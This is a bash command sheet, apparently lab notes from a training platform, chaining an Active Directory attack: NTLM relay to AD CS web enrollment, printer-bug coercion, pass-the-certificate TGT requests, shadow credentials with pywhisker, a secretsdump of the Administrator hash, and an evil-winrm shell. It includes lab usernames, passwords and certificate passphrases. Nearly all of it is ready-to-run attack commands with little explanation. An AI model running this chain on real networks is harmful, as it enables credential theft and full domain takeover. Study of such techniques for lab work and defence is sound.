
```bash
# A certificate authority configured  in web
/CertSrv
 
# Attackers can use Impacket’s ntlmrelayx to listen for inbound connections and relay them to the web enrollment service 
impacket-ntlmrelayx -t <http://10.129.234.110/certsrv/certfnsh.asp> --adcs -smb2support --template KerberosAuthentication
 
# One way to force machine accounts to authenticate against arbitrary hosts is by exploiting the printer bug. 
python3 printerbug.py INLANEFREIGHT.LOCAL/wwhite:"package5shores_topher1"@10.129.234.109 10.10.16.12
 
# Pass-the-Certificate attack to obtain a TGT as DC01$ with gettgtpkinit.py
git clone <https://github.com/dirkjanm/PKINITtools.git> && cd PKINITtools
python3 -m venv .venv
source .venv/bin/activate
pip3 install -r requirements.txt
 
python3 gettgtpkinit.py -cert-pfx ../krbrelayx/DC01\\$.pfx -dc-ip 10.129.234.109 'inlanefreight.local/dc01$' /tmp/dc.ccache
 
# Note: If you encounter error stating "Error detecting the version of libcrypto", it can be fixed by installing the oscrypto library.
pip3 install -I git+https://github.com/wbond/oscrypto.git

# Once we successfully obtain a TGT, we're back in familiar Pass-the-Ticket (PtT) territory. 
export KRB5CCNAME=/tmp/dc.ccache
impacket-secretsdump -k -no-pass -dc-ip 10.129.234.109 -just-dc-user Administrator 'INLANEFREIGHT.LOCAL/DC01$'@DC01.INLANEFREIGHT.LOCAL

# ---- We can use pywhisker to perform this attack from a Linux system.
pywhisker --dc-ip 10.129.234.109 -d INLANEFREIGHT.LOCAL -u wwhite -p 'package5shores_topher1' --target jpinkman --action add

python3 gettgtpkinit.py -cert-pfx ../eFUVVTPf.pfx -pfx-pass 'bmRH4LK7UwPrAOfvIx6W' -dc-ip 10.129.234.109 INLANEFREIGHT.LOCAL/jpinkman /tmp/jpinkman.ccache

# python3 gettgtpkinit.py -cert-pfx ../eFUVVTPf.pfx -pfx-pass 'bmRH4LK7UwPrAOfvIx6W' -dc-ip 10.129.234.109 INLANEFREIGHT.LOCAL/jpinkman /tmp/jpinkman.ccache
export KRB5CCNAME=/tmp/jpinkman.ccache
klist

evil-winrm -i dc01.inlanefreight.local -r inlanefreight.local
```